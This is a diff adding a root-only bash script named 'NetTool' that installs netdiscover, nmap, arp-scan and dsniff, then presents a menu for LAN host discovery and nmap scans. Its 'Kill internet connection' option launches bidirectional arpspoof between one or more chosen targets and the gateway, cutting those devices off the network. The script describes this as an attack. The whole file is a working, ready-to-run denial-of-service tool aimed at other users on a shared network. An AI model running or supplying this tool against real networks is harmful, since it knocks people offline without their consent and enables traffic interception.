@@ -1,0 +1,495 @@
+#!/bin/bash
+#Colors
+
+clear
+red='\e[0;31m'
+green='\e[1;32m'
+orange='\e[1;33m'
+lightblue='\e[0;34m'
+purple='\e[0;35m'
+cyan='\e[0;36m'
+lightgray='\e[0;37m'
+darkgray='\e[1;30em'
+lightred='\e[1;31m'
+lightgreen='\e[0;32m'
+yellow='\e[0;49;93m'
+blue='\e[1;34m'
+lightpurple='\e[1;35m'
+lightcyan='\e[1;36m'
+white='\e[1;37m'
+nc="\e[0m"
+#: <<'END_COMMENT'
+nc="\e[0m"
+#ROOT PRIVILEGIES
+if [[ $EUID -ne 0 ]]; then
+    echo -e "$red You don't have Root privilegies, execute the script as root.$nc"
+    exit 1
+fi
+clear
+echo -e "$red""Staring.""$nc"
+sleep 0.5
+clear
+echo -e "$red""Staring..""$nc"
+sleep 0.5
+clear
+echo -e "$red""Staring...""$nc"
+
+sleep 1
+clear
+sleep 0.5
+echo -e "               \e[1;31m [+][+][+]--NetTool--[+][+][+] \e[0m         "
+echo""
+echo -e "              \e[0;34mVersion : 1.0\e[0m         "
+echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
+echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
+
+echo""
+sleep 0.5
+#Checking for internet connecttion
+echo -e "$orange""Checking Internet connection.""$nc"
+sleep 0.5
+clear
+echo -e "               \e[1;31m [+][+][+]--NetTool--[+][+][+] \e[0m         "
+echo""
+echo -e "              \e[0;34mVersion : 1.0\e[0m         "
+echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
+echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
+
+echo""
+echo -e "$orange""Checking Internet connection..""$nc"
+sleep 0.5
+clear
+echo -e "               \e[1;31m [+][+][+]--NetTool--[+][+][+] \e[0m         "
+echo""
+echo -e "              \e[0;34mVersion : 1.0\e[0m         "
+echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
+echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
+
+echo""
+echo -e "$orange""Checking Internet connection...""$nc"
+sleep 1
+
+wget -q --spider https://www.google.com
+
+if [ $? -eq 0 ]; then
+    echo -e "Connected to internet [$green✓$nc]$nc "
+else
+    echo -e "No internet connection [$red✗$nc] $nc "
+    echo -e "$orange""Please make sure you are connected to internet!" "$nc"
+    exit 1
+fi
+#END_COMMENT
+sleep 0.5
+
+if  pgrep -x "apt" >/dev/null || pgrep -x "dpkg" >/dev/null ;
+
+then 
+    
+    echo -e "$red""Another installation is running! Please wait or kill the proccess.$nc"
+    echo -e "$blue""The following proccess can cancel the installation$nc"
+    pgrep apt 
+    pgrep dpkg 
+    echo -e -n "$yellow""Do you want to kill the proccess? (Y/n) "
+
+    read answ
+    case $answ in
+        y)  pkill apt
+            pkill dpkg
+            echo -e "$orange""Checking for required tools...$nc"
+sleep 1
+
+
+
+if [ -f "/usr/sbin/netdiscover" ]; then
+    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing netdiscover...$nc"
+    sleep 1
+    xterm -e "apt install netdiscover -y"
+    if [[ -f "/usr/sbin/netdiscover" ]]; then
+        echo -e "$white""netdiscover" "$green""successfuly installed ✓$nc"
+        sleep 1
+    fi
+fi
+
+if [[ -f "/usr/bin/nmap" ]]; then
+    echo -e "$white""nmap$nc""$yellow ==========>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""nmap$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing nmap...$nc"
+    sleep 1
+    xterm -e "apt install nmap -y"
+    if [[ -f "/usr/bin/nmap" ]]; then
+        echo -e "$white""nmap" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+if [[ -f "/usr/sbin/arpspoof" ]]; then
+    echo -e "$white""arpspoof$nc""$yellow ======>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""arpspoof$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing arpspoof...$nc"
+    sleep 1
+    
+    xterm -e "apt install dsniff -y"
+    if [ -f "/usr/sbin/arpspoof" ]; then
+        echo -e "$white""arpspoof" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+
+if [[ -f "/usr/sbin/arp-scan" ]]; then
+    echo -e "$white""arp-scan$nc""$yellow ======>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""arp-scan$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing arp-scan...$nc"
+    sleep 1
+    
+    xterm -e "apt install arp-scan -y"
+    if [ -f "/usr/sbin/arp-scan" ]; then
+        echo -e "$white""arp-scan" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+echo""
+echo -e "$lightgreen""All tools have been checked! [✓]$nc"
+            ;;
+        Y)  pkill apt
+            pkill dpkg
+            echo -e "$orange""Checking for required tools...$nc"
+sleep 1
+
+
+
+if [ -f "/usr/sbin/netdiscover" ]; then
+    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing netdiscover...$nc"
+    sleep 1
+    xterm -e "apt install netdiscover -y"
+    if [[ -f "/usr/sbin/netdiscover" ]]; then
+        echo -e "$white""netdiscover" "$green""successfuly installed ✓$nc"
+        sleep 1
+    fi
+fi
+
+if [[ -f "/usr/bin/nmap" ]]; then
+    echo -e "$white""nmap$nc""$yellow ==========>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""nmap$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing nmap...$nc"
+    sleep 1
+    xterm -e "apt install nmap -y"
+    if [[ -f "/usr/bin/nmap" ]]; then
+        echo -e "$white""nmap" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+if [[ -f "/usr/sbin/arpspoof" ]]; then
+    echo -e "$white""arpspoof$nc""$yellow ======>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""arpspoof$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing arpspoof...$nc"
+    sleep 1
+    
+    xterm -e "apt install dsniff -y"
+    if [ -f "/usr/sbin/arpspoof" ]; then
+        echo -e "$white""arpspoof" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+
+if [[ -f "/usr/sbin/arp-scan" ]]; then
+    echo -e "$white""arp-scan$nc""$yellow ======>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""arp-scan$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing arp-scan...$nc"
+    sleep 1
+    
+    xterm -e "apt install arp-scan -y"
+    if [ -f "/usr/sbin/arp-scan" ]; then
+        echo -e "$white""arp-scan" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+echo""
+echo -e "$lightgreen""All tools have been checked! [✓]$nc"
+            ;;
+
+        n) exit 1
+        ;;
+        N) exit 1
+        ;;
+        *)
+        exit 1 ;;
+    esac
+else    
+#checking for required tools
+echo -e "$orange""Checking for required tools...$nc"
+sleep 1
+
+
+
+if [ -f "/usr/sbin/netdiscover" ]; then
+    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""netdiscover$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing netdiscover...$nc"
+    sleep 1
+    xterm -e "apt install netdiscover -y"
+    if [[ -f "/usr/sbin/netdiscover" ]]; then
+        echo -e "$white""netdiscover" "$green""successfuly installed ✓$nc"
+        sleep 1
+    fi
+fi
+
+if [[ -f "/usr/bin/nmap" ]]; then
+    echo -e "$white""nmap$nc""$yellow ==========>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""nmap$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing nmap...$nc"
+    sleep 1
+    xterm -e "apt install nmap -y"
+    if [[ -f "/usr/bin/nmap" ]]; then
+        echo -e "$white""nmap" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+if [[ -f "/usr/sbin/arpspoof" ]]; then
+    echo -e "$white""arpspoof$nc""$yellow ======>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""arpspoof$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing arpspoof...$nc"
+    sleep 1
+    
+    xterm -e "apt install dsniff -y"
+    if [ -f "/usr/sbin/arpspoof" ]; then
+        echo -e "$white""arpspoof" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+
+if [[ -f "/usr/sbin/arp-scan" ]]; then
+    echo -e "$white""arp-scan$nc""$yellow ======>$nc" "$green[✓] installed$nc"
+    sleep 0.5
+else
+    echo -e "$white""arp-scan$nc""$yellow ===>$nc" "$red[✗] Not installed$nc"
+    echo -e "$orange""Downloading & Installing arp-scan...$nc"
+    sleep 1
+    
+    xterm -e "apt install arp-scan -y"
+    if [ -f "/usr/sbin/arp-scan" ]; then
+        echo -e "$white""arp-scan" "$green""successfuly installed ✓$nc"
+    fi
+fi
+
+echo""
+echo -e "$lightgreen""All tools have been checked! [✓]$nc"
+fi
+sleep 2
+clear
+
+while true
+do
+    clear
+    #END_COMMENT
+    #Menu
+    echo -e "               \e[1;31m -- NetTool -- \e[0m         "
+    echo""
+    echo -e "              \e[0;34mVersion : 1.0\e[0m         "
+    echo -e "              \e[0;34mCredits : Disc0nect\e[0m         "
+    echo -e "              \e[0;34mEmail   : Montasilinigamer@gmail.com\e[0m         "
+    
+    echo""
+    ip=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
+    interafce=$(route | grep '^default' | grep -o '[^ ]*$')
+    gateway=$(netstat -rn | grep '^\(default\|0\.0\.0\.0\)' | awk '{print $2}')
+    
+    echo -e ""$orange""interafce:$nc" $interafce | "$orange""gateway: $nc"$gateway | "$orange""ip:$nc" $ip"
+    
+    echo""
+    echo -e "$orange""1)$nc""$green""Scan for hosts               $nc""$orange""2)$nc""$green""Kill internet connection$nc"
+    echo -e "$orange""3)$nc""$green""Scan for hosts(Nmap scan)    $nc""$orange""4)$nc""$green""Exit$nc"
+    echo -e
+    
+    echo -e -n "$yellow""Select you option : $nc"
+    read option
+    echo ""
+    case $option in
+        1)
+            echo -e "\e[1;34mScanning...\e[0m"
+            sleep 2
+            arp-scan --localnet
+            echo -e "\e[1;34mYour scan completed!\e[0m"
+            sleep 2
+            echo -e "\e[1;32mPress RETURN To Continue \c\e[0m"
+            read input
+            sleep 0.5
+        ;;
+        2)
+            echo -e "$orange""1-$nc""$green""kill connection for 1 target$nc"
+            echo -e "$orange""2-$nc""$green""kill connection for muliple targets$nc"
+            echo -e -n "$orange""Select your option : $nc"
+            read opt
+            case $opt in
+                1)
+                    clear
+                    echo -e "\e[1;34mScanning.\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning..\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning...\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning.\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning..\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning...\e[0m"
+                    sleep 2
+                    arp-scan --localnet
+                    echo -e -n "$yellow""Type your target machine : $nc"
+                    read target
+                    xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interafce -t $target $gateway" &
+                    xterm -e "echo CTRL+C TO CANCLE THE ATTACK ! && sleep 2 && arpspoof -i $interafce -t $gateway $target" &
+                    sleep 1
+                    echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                    read input
+                    pkill arpspoof
+                    echo -e "$blue""Going back to Menu...$nc"
+                    sleep 1
+                ;;
+                2)
+                    clear
+                    echo -e "\e[1;34mScanning.\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning..\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning...\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning.\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning..\e[0m"
+                    sleep 0.5
+                    clear
+                    echo -e "\e[1;34mScanning...\e[0m"
+                    sleep 2
+                    arp-scan --localnet
+                    
+                    echo -e -n "$yellow""How many target(s)? $nc"
+                    read targets
+                    for (( i = 1; i < targets+1; i++ )); do
+                        echo -n "type your target "$i" : "
+                        read trgt
+                        echo -e "$cyan""killing$nc" "$red"$trgt"$nc"
+                        nohup arpspoof -i $interafce -t $trgt $gateway </dev/null &>/dev/null &
+                        nohup arpspoof -i $interafce -t $gateway $trgt </dev/null &>/dev/null &
+                    done
+                    sleep 1
+                    echo -e "\e[1;32mPress RETURN To CANCLE \c\e[0m"
+                    read input
+                    pkill arpspoof
+                    echo -e "$blue""Going back to Menu...$nc"
+                    sleep 1
+            esac
+        ;;
+        3)
+            echo -e " [+] Nmap scan [+] "
+            echo ""
+            echo -e "$orange""1-$nc""$green""Simple scan $nc"
+            echo -e "$orange""2-$nc""$green""Advanced scan $nc" "$blue""(Slow scan but detailed)$nc"
+            echo -e -n "$yellow""Select your scan mode : $nc"
+            read opt2
+            case $opt2 in
+                1)
+                    echo -e -n "$yellow""Type your network subnet $nc""$blue""(ex:192.168.1.0/24): $nc"
+                    read range
+                    
+
+                    wget -q --spider https://www.google.com
+
+                if [ $? -eq 0 ]; then
+                    echo -e "\e[1;34mScanning...\e[0m"
+                    sleep 1
+                    nohup nmap -oN simplescan.txt -sP $range </dev/null &>/dev/null
+                    sed '1d;$d' simplescan.txt
+                    rm simplescan.txt
+                    echo -e "\e[1;34mYour scan completed!\e[0m"
+                    sleep 2
+                    echo -e "\e[1;32mPress RETURN To Continue \c\e[0m"
+                    read input
+                    echo -e "$blue""Going back to Menu...$nc"
+                    sleep 1
+                else
+                    sleep 1
+                    echo -e "$red""connection lost!$nc"
+                    sleep 0.5
+                    echo -e "$lightcyan""Please fix your internet connection and try again.$nc"
+                    sleep 4
+                    echo -e "$blue""Going back to Menu...$nc"
+                    sleep 1
+
+                fi
+
+                ;;
+                2)
+                    wget -q --spider https://www.google.com
+
+                if [ $? -eq 0 ]; then
+                    echo -e -n "$yellow""Type your network subnet $nc""$blue""(ex:192.168.1.0/24): $nc"
+                    read range
+                    echo -e "\e[1;34mScanning...\e[0m"
+                    sleep 1
+                    nohup nmap -oN advcan.txt -A $range </dev/null &>/dev/null
+                    sed '1d;$d' advcan.txt
+                    rm advcan.txt
+                    echo -e "\e[1;34mYour scan completed!\e[0m"
+                    sleep 2
+                    echo -e "\e[1;32mPress RETURN To Continue \c\e[0m"
+                    read input
+                    echo -e "$blue""Going back to Menu...$nc"
+                    sleep 1
+                else
+                    sleep 1
+                    echo -e "$red""connection lost!$nc"
+                    sleep 0.5
+                    echo -e "$lightcyan""Please fix your internet connection and try again.$nc"
+                    sleep 4
+                    echo -e "$blue""Going back to Menu...$nc"
+                    sleep 1
+
+                fi
+                ;;
+                
+            esac
+        ;;
+        4)
+            echo -e "$red""Bye bye :)$nc"
+            sleep 1
+            clear
+            exit 1
+            
+        ;;
+    esac
+done
